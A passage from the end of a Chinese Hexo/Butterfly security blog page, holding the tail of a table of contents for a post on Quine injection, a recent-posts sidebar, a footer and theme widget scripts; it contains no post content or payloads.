href="#%E5%AE%A1%E8%AE%A1%E5%90%8E%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-text">审计后的思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quine%E6%B3%A8%E5%85%A5"><span class="toc-text">Quine注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks"><img src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lynn's Tasks"/></a><div class="content"><a class="title" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks">Lynn's Tasks</a><time datetime="2023-12-14T03:43:49.000Z" title="发表于 2023-12-14 11:43:49">2023-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web安全（目前）绕过|姿势总结"/></a><div class="content"><a class="title" href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结">Web安全（目前）绕过|姿势总结</a><time datetime="2023-12-13T12:47:55.000Z" title="发表于 2023-12-13 20:47:55">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/13/phpWeiXieYi/" title="php伪协议"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2023/12/13/phpWeiXieYi/" title="php伪协议">php伪协议</a><time datetime="2023-12-13T03:24:58.000Z" title="发表于 2023-12-13 11:24:58">2023-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/05/neiwangSecury/" title="内网安全"><img src="/img/reHe.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网安全"/></a><div class="content"><a class="title" href="/2023/12/05/neiwangSecury/" title="内网安全">内网安全</a><time datetime="2023-12-05T13:51:20.000Z" title="发表于 2023-12-05 21:51:20">2023-12-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/02/ctfshow/" title="ctfshow|Recording"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow|Recording"/></a><div class="content"><a class="title" href="/2023/12/02/ctfshow/" title="ctfshow|Recording">ctfshow|Recording</a><time datetime="2023-12-02T14:41:06.000Z" title="发表于 2023-12-02 22:41:06">2023-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: ture"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">格言🧬</p><div class="bg-ad"><div>成功的花，人们只惊羡她现时的明艳，然而当初她的芽儿，浸透了奋斗的泪泉，洒遍了牺牲的血雨。成功不是一时的,而是以日夜的奋斗拼搏出来的。锲而舍之，朽木不折；锲而不舍，金石可镂。朋友们，一起去探索那浩瀚的星辰吧✨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">点击开启星辰之旅</a></div></div></div></div></div><div class="ft-item-2"><p class="ft-t">猜你想看💡<ul class="ft-links"><li><a href="/personal/about/">关于作者</a></li><li><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a></li><li><a href="/tags/">文章标签</a></li></ul></p></div></div><div class="copyright"><span><b>&copy;2023</b></span><span><b>&nbsp;&nbsp;By DralinF</b></span></div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script src="/js/jquery.js"></script><script src="/js/sakura.js"></script><script src="/js/foot.js"></script><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script defer src="/js/runtime.js"></script><script async src="/js/title.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '113.34532,23.15624';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
